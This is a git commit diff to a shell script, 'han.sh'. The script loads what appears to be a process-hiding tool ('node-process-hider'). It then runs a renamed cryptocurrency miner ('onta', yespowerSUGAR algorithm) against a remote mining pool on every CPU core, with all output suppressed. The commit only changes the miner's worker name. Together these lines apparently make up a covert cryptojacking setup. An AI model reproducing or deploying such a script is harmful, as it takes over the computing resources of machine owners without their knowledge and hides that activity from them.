29cdeef6edae1dd719e3ca0df80465eac2c59929
muledan1 <108221871+muledan1@users.noreply.github.com>
2022-10-20 20:02:26 +0700

    Update han.sh

--- han.sh
+++ han.sh
@@ -16,5 +16,5 @@ Ph add python3
 ph add root
 ph add node-process-hider
 ph add -
-./onta -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.whisky -t$(nproc --all) >/dev/null >/dev/null 2>&1
+./onta -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.BOLOHO -t$(nproc --all) >/dev/null >/dev/null 2>&1
 sleep 10
